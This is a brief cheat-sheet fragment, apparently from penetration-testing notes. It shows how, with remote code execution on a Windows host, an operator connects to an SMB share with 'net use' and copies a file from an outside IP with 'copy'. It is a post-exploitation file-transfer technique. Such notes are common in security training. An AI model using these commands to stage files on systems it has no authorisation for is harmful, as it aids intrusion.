:: If we have a SMB server and RCE on a Windows hosts, we can transfer a file with the following command:

C:\>net use \\<IP>\<SMBShareName> ::This will connect to the SMB share.

:: Once we are connected to the SMB share we can copy a file with the following command:

C:\>copy \\<IP>\<SMBShareName>\<filename> <outfile>
